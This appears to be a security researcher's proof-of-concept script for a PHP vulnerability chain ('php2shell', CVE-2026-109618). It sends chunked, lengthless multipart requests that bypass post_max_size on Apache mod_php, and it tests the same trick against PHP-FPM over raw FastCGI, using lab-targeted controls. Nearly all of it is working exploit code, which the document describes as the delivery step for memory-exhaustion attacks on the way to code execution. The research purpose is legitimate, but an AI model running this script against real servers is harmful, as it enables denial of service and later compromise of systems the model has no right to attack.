#!/usr/bin/env python3
"""
CVE-2026-109618 prerequisite reproduction (php2shell writeup, step 1):
the post_max_size bypass via a lengthless request.

Advisory mechanism under test (calif.io/php2shell, "You said OOM-fatal?"):
  "PHP compares post_max_size with the declared Content-Length before
   automatic POST parsing begins, but it does not enforce the same limit
   against the bytes it actually consumes. Apache can therefore pass a
   chunked HTTP/1.1 or lengthless HTTP/2 multipart request with no
   meaningful declared length."

Two demonstrations, each with a declared-Content-Length control:

  A) Apache mod_php (default settings: post_max_size=8M):
     - chunked multipart body, total consumed bytes ~2x post_max_size,
       NO Content-Length header -> Apache de-chunks into a lengthless
       stream; PHP parses every byte ($_POST/$_FILES populated).
     - control: identical body WITH Content-Length -> PHP rejects it
       before parsing ("POST Content-Length of N bytes exceeds the
       limit", rfc1867_post_handler checks the DECLARED length only).
     Result observed: BYPASS on mod_php — the advisory's exact claim
     ("Apache can therefore pass a chunked HTTP/1.1 ... request with no
     meaningful declared length").

  B) PHP-FPM directly over FastCGI (no frontend in the way):
     - FCGI_PARAMS without a CONTENT_LENGTH param + body on FCGI_STDIN
     - control: same request with CONTENT_LENGTH declared.
     Result observed: NOT a bypass on FPM — sapi_cgi_read_post clamps
     POST reads to the declared CONTENT_LENGTH ("remaining = content_
     length - read_post_bytes", sapi/fpm/fpm_main.c), so a lengthless
     request delivers ZERO bytes to the parser. The declared-length
     control over post_max_size is still rejected by the rfc1867 gate.
     The same holds through nginx (fastcgi_request_buffering off +
     chunked client request -> parsed nothing). FPM's CVE-2026-109618
     exposure is instead the in-memory amplification producers whose
     WIRE stays under post_max_size: verify_empty_upload_expansion.py.

This is the delivery mechanism for the OOM producers (verify_cve_109618_
oom.py / verify_empty_upload_expansion.py): on mod_php it lets an
attacker deliver more parsed bytes than post_max_size permits.

Usage:
  # A) against the mod_php ASAN lab (lab-asan-modphp on :18082)
  python3 verify_postmax_bypass.py --mode apache --host 127.0.0.1 --port 18082

  # B) against the FPM lab's exposed FastCGI port (lab/ on :9000);
  #    --field-mb must exceed the target's post_max_size (lab/: 128M)
  python3 verify_postmax_bypass.py --mode fcgi --host 127.0.0.1 --port 9000 --field-mb 130
"""
import argparse
import socket
import sys


BOUNDARY = "POSTMAXBYPASS"


def build_body(field_mb, file_mb):
    """Multipart body: one large POST field + one file part.
    POST fields are materialized in memory, file data streams through
    the parser — both prove full consumption of the declared-vs-delivered
    mismatch."""
    big = b"A" * (field_mb * 1024 * 1024)
    fdata = b"B" * (file_mb * 1024 * 1024)
    body = (
        b"--" + BOUNDARY.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="bigfield"\r\n\r\n' + big + b"\r\n"
        b"--" + BOUNDARY.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="f"; filename="big.bin"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n" + fdata + b"\r\n"
        b"--" + BOUNDARY.encode() + b"--\r\n"
    )
    return body


def http_exchange(host, port, request, timeout=120):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(request)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def send_chunked(host, port, path, body, chunk_size=65536, extra_headers=""):
    """HTTP/1.1 Transfer-Encoding: chunked — no Content-Length at all."""
    preamble = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n{extra_headers}\r\n"
    ).encode()
    out = [preamble]
    for i in range(0, len(body), chunk_size):
        chunk = body[i:i + chunk_size]
        out.append(b"%x\r\n" % len(chunk) + chunk + b"\r\n")
    out.append(b"0\r\n\r\n")
    return http_exchange(host, port, b"".join(out))


def send_declared(host, port, path, body):
    """Control: identical body, declared Content-Length."""
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return http_exchange(host, port, req)


# ---------------------------------------------------------------- FastCGI
FCGI_BEGIN, FCGI_PARAMS, FCGI_STDIN, FCGI_STDOUT, FCGI_END = 1, 4, 5, 6, 9


def fcgi_record(ctype, req_id, content):
    out = bytes([1, ctype, req_id >> 8, req_id & 0xFF,
                 (len(content) >> 8) & 0xFF, len(content) & 0xFF, 0, 0])
    return out + content


def fcgi_param(name, value):
    def enc(n):
        if n < 128:
            return bytes([n])
        return bytes([(n >> 24) | 0x80, (n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF])
    return enc(len(name)) + enc(len(value)) + name + value


def fcgi_exchange(host, port, script, body, content_length=None, timeout=120):
    params = {
        "SCRIPT_FILENAME": script,
        "SCRIPT_NAME": "/probe.php",
        "REQUEST_METHOD": "POST",
        "CONTENT_TYPE": f"multipart/form-data; boundary={BOUNDARY}",
        "DOCUMENT_ROOT": "/var/www/html",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "REQUEST_URI": "/probe.php",
    }
    if content_length is not None:
        # Control: declare the true length -> PHP applies the gate.
        params["CONTENT_LENGTH"] = str(content_length)
        # NOTE: for the *bypass* case we simply omit CONTENT_LENGTH —
        # exactly what a streaming frontend (chunked input) provides.
    pkgs = b"".join(fcgi_param(k.encode(), v.encode()) for k, v in params.items())
    req = fcgi_record(FCGI_BEGIN, 1, bytes([0, 1, 0, 0, 0, 0, 0, 0]))
    # PARAMS in <= 65520-byte records, then an empty record to terminate.
    buf = pkgs
    while buf:
        req += fcgi_record(FCGI_PARAMS, 1, buf[:65520])
        buf = buf[65520:]
    req += fcgi_record(FCGI_PARAMS, 1, b"")
    # STDIN body chunks, then an empty record to terminate.
    for i in range(0, len(body), 32768):
        req += fcgi_record(FCGI_STDIN, 1, body[i:i + 32768])
    req += fcgi_record(FCGI_STDIN, 1, b"")

    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(req)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def summarize(tag, resp):
    print(f"  [{tag}]")
    if not resp:
        print(f"    <no response>")
        return "none"
    text = resp.decode("latin1", "replace")
    counts = [l for l in text.splitlines()
              if l.startswith(("POST count", "FILES count", "memory peak"))]
    for line in counts:
        print(f"    {line}")
    if "exceeds the limit" in text:
        print("    [GATE] PHP rejected on the DECLARED Content-Length:"
              " 'POST Content-Length ... exceeds the limit'")
        return "gate-rejected"
    if any("POST count: 0" in l or "FILES count: 0" in l for l in counts):
        if all("count: 0" in l for l in counts if "count" in l):
            return "no-parse"
    return "consumed"


def parse_ini_probe(resp):
    """probe.php prints memory_limit/post_max_size — parse them."""
    ini = {}
    for line in resp.decode("latin1", "replace").splitlines():
        if ":" in line and line.startswith(("memory_limit", "post_max_size")):
            k, v = line.split(":", 1)
            ini[k.strip()] = v.strip()
    return ini


def human_limit(ini, default=8 * 1024 * 1024):
    raw = ini.get("post_max_size", "")
    mult = {"": 1, "K": 1024, "M": 1024 * 1024, "G": 1024 ** 3}
    try:
        return int(raw[:-1] or 0) * mult[raw[-1:].upper() if raw[-1:].isalpha() else ""]
    except (ValueError, KeyError, IndexError):
        return default


def fmt_mb(n):
    return f"{n / 1024 / 1024:.0f} MB"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=["apache", "fcgi"], default="apache")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18082)
    ap.add_argument("--path", default="/probe.php")
    ap.add_argument("--script", default="/var/www/html/probe.php",
                    help="fcgi mode: SCRIPT_FILENAME inside the container")
    ap.add_argument("--field-mb", type=int, default=16)
    ap.add_argument("--file-mb", type=int, default=1)
    args = ap.parse_args()

    # Read the target's real limits first so the messaging is honest.
    if args.mode == "apache":
        probe = http_exchange(args.host, args.port,
                              f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
                              f"Connection: close\r\n\r\n".encode())
        probe_text = probe.split(b"\r\n\r\n", 1)[-1]
    else:
        probe = fcgi_exchange(args.host, args.port, args.script, b"")
        probe_text = probe
    ini = parse_ini_probe(probe_text)
    limit = human_limit(ini)
    print("[*] CVE-2026-109618 prerequisite: post_max_size handling of")
    print("    lengthless (chunked) requests, per SAPI")
    print(f"[*] Mode: {args.mode}  target: {args.host}:{args.port}")
    print(f"[*] Target post_max_size: {ini.get('post_max_size', '?')}"
          f"  memory_limit: {ini.get('memory_limit', '?')}")
    print()

    body = build_body(args.field_mb, args.file_mb)
    wire = len(body)
    print(f"[*] Delivered body: {fmt_mb(wire)}"
          f" (POST field {args.field_mb} MB + file {args.file_mb} MB)")
    if wire <= limit:
        print(f"    NOTE: body is under this target's post_max_size"
              f" ({fmt_mb(limit)}) — the gate case will not reject;")
        print("    raise --field-mb above the limit for the full A/B.")

    if args.mode == "apache":
        print()
        print("[1] Control — identical body, declared Content-Length"
              f" ({len(body)} bytes):")
        r_ctrl = send_declared(args.host, args.port, args.path, body)
        ctrl = summarize("control", r_ctrl)
        print()
        print("[2] Test — same body, Transfer-Encoding: chunked, NO"
              " Content-Length:")
        r_bypass = send_chunked(args.host, args.port, args.path, body)
        byp = summarize("test   ", r_bypass)
        print()
        if byp == "consumed" and ctrl == "gate-rejected":
            print("[EVIDENCE] LENGTHLESS BYPASS REPRODUCED (mod_php path):")
            print(f"    - {fmt_mb(wire)} of multipart data were consumed and parsed")
            print(f"      — above post_max_size ({fmt_mb(limit)}) — because the")
            print("      request carried no usable declared Content-Length;")
            print("      Apache de-chunks into a lengthless stream.")
            print("    - The identical body with a declared Content-Length was")
            print("      rejected before parsing (rfc1867 checks the DECLARED")
            print("      length only: main/rfc1867.c rfc1867_post_handler).")
            print("    - This is the writeup's OOM delivery vehicle: it removes")
            print("      post_max_size as a bound on parsed bytes, so a chosen")
            print("      later allocation can be made to hit memory_limit.")
        elif byp == "no-parse":
            print("[EVIDENCE] FPM BEHAVIOR CONFIRMED (via this frontend):")
            print("    - The chunked/lengthless request parsed to NOTHING")
            print("      (POST/FILES count 0). PHP-FPM bounds POST reads by")
            print("      the declared CONTENT_LENGTH (sapi/fpm/fpm_main.c")
            print("      sapi_cgi_read_post: 'remaining = content_length -")
            print("      read_post_bytes'), so a lengthless request delivers")
            print("      zero bytes to the parser: no gate bypass on FPM.")
            print("    - FPM's OOM exposure is instead the in-memory")
            print("      amplification producers (wire under post_max_size,")
            print("      parsed representation over memory_limit): see")
            print("      verify_empty_upload_expansion.py.")
        else:
            print("[*] Inconclusive — see output above and tune --field-mb")
            print("    against the target's post_max_size.")
    else:
        print()
        print(f"[1] Control — FCGI_PARAMS with CONTENT_LENGTH={len(body)}:")
        r_ctrl = fcgi_exchange(args.host, args.port, args.script, body,
                               content_length=len(body))
        ctrl = summarize("control", r_ctrl)
        print()
        print("[2] Test — FCGI_PARAMS without CONTENT_LENGTH (the shape a"
              " streaming frontend provides for chunked input):")
        r_bypass = fcgi_exchange(args.host, args.port, args.script, body,
                                 content_length=None)
        byp = summarize("test   ", r_bypass)
        print()
        if byp == "no-parse" and ctrl == "gate-rejected":
            print("[EVIDENCE] FPM BOUNDARY CONFIRMED:")
            print("    - Declared CONTENT_LENGTH > post_max_size"
                  f" ({fmt_mb(limit)}): rejected by the rfc1867 gate")
            print("      (declared-length check).")
            print("    - No CONTENT_LENGTH: PHP-FPM parsed ZERO POST bytes")
            print("      despite the full body on FCGI_STDIN — sapi_cgi_read_post")
            print("      clamps reads to the declared length")
            print("      ('remaining = SG(request_info).content_length -")
            print("       SG(read_post_bytes)', sapi/fpm/fpm_main.c).")
            print("    => The lengthless bypass does NOT apply to FPM; it is the")
            print("       Apache mod_php property the advisory describes")
            print("       ('Apache can therefore pass a chunked HTTP/1.1 ...")
            print("       request with no meaningful declared length').")
            print("    => FPM's CVE-2026-109618 producers keep the wire under")
            print("       post_max_size and amplify in memory instead.")
        else:
            print("[*] Inconclusive — for the gate control, --field-mb must")
            print("    exceed the target's post_max_size; the no-CONTENT_LENGTH")
            print("    case should always parse nothing on FPM.")
    print()
    print("[*] Honest ceiling: this maps the byte-accounting boundary per")
    print("    SAPI only; the OOM producers are separate steps")
    print("    (verify_cve_109618_oom.py, verify_empty_upload_expansion.py),")
    print("    and corruption-to-RCE escalation is out of scope for this repo.")


if __name__ == "__main__":
    main()

